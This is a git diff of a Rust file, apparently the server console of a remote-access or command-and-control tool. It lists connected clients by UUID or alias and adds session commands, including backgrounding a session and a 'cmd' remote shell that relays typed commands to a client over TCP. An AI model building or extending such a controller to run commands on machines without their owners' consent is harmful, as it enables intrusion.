@@ -5,6 +5,7 @@ use std::sync::Arc;
 use uuid::Uuid;
 use std::thread;
 
+
 use crate::utils::database_struct::Database;
 use crate::utils::database_struct::ClientInfo;
 
@@ -48,16 +49,16 @@ pub fn server(database:Arc<Database>){
 
 }
 
-pub fn handle_clients(database: Arc<Database>, input:&str){
+pub fn handle_clients(database: Arc<Database>, input:&str) {
 
-
+     
     let database_clone = Arc::clone(&database);
 
     // Tenta buscar pelo alias
     if let Some(id) = database_clone.alias_to_id(input) {
         // Alias existe: usa o ID associado
         match database_clone.get_stream(&id) {
-            Some(ip) => handle_tcp(&ip),
+            Some(ip) => handle_tcp(&ip) ,
             None => println!("Cliente encontrado, mas sem conexão ativa."),
         }
     } else {
@@ -65,35 +66,60 @@ pub fn handle_clients(database: Arc<Database>, input:&str){
         match input.parse::<Uuid>() {
             Ok(uuid) => {
                 match database_clone.get_stream(&uuid) {
-                    Some(ip) => handle_tcp(&ip),
+                    Some(ip) =>  handle_tcp(&ip),
                     None => println!("UUID não encontrado ou sem conexão."),
                 }
             }
             Err(_) => println!("Input inválido: não é um alias registrado nem um UUID."),
         }
     }
+    
+ 
+ 
 
 }
 
-fn handle_tcp( stream: & TcpStream){
+pub fn handle_tcp( stream: & TcpStream){
     std::process::Command::new("clear").status().unwrap();
-    println!("Cliente: {}", stream.peer_addr().unwrap().ip());
-    
-
+ 
     loop {
-         
-        
-        print!("{} >",stream.peer_addr().unwrap().ip());
+        print!("{}>",stream.peer_addr().unwrap().ip());
         io::stdout().flush().expect("Falha ao fazer flush do stdout");
 
 
         
-        let input = input();
+        let input2 = input();
+ 
+        match input2.as_str(){
+            "help" => {
+                println!("-----Host-Commands----");
+                println!("bg -> Backgrounds the session");
+                println!("cmd -> Connect to remote shell terminal");
+                println!("help -> Help message");
+            }
+            "bg" => break,
+            "cmd" => {
+                loop {
+                    let dir = interact("cd".to_string(), stream).trim().to_string();
 
-        match input.as_str(){
-            "/voltar" => break,
-            _ => println!("{}",interact(input, stream))
-            
+                    print!("{}",dir);
+                    io::stdout().flush().expect("Falha ao fazer flush do stdout");
+                    let input2 = input();
+                    
+                    match input2.as_str() {
+                        "/help" => {
+                            println!("---Cmd-Commands---");
+                            println!("/exit -> Exit from cmd terminal.")
+                        }
+                        "/exit" => break,
+                        _ => {
+                            let resposta = interact(input2, stream).replacen(&dir, "",1);
+                            println!("{}",resposta)},
+                    }
+                    
+                }
+            }
+            _ => println!("Commando Invalido")            
         }
          
         
@@ -102,19 +128,6 @@ fn handle_tcp( stream: & TcpStream){
 
 pub fn manage_alias(database:Arc<Database>,id:&str,alias:&str){
 
-    // let mut send:String = String::new();
-    // let mut buffer:String = String::new();
-    //     print!("Digite o ID: ");
-    //     io::stdout().flush().expect("Falha ao fazer flush do stdout");
-
-    //     io::stdin().read_line(&mut buffer).expect("Não foi possivel ler a mensagem");
-
-    //     print!("Digite um alias:");
-    //     io::stdout().flush().expect("Falha ao fazer flush do stdout");
-
-    //     io::stdin().read_line(&mut send).expect("Não foi possivel ler a mensagem");
-        
-    //     let input = send.trim().to_lowercase();
         let id:Uuid = id.trim().parse().expect("Erro na conversão do buffer para Uuid");
 
     database.update_alias(&id,&alias);
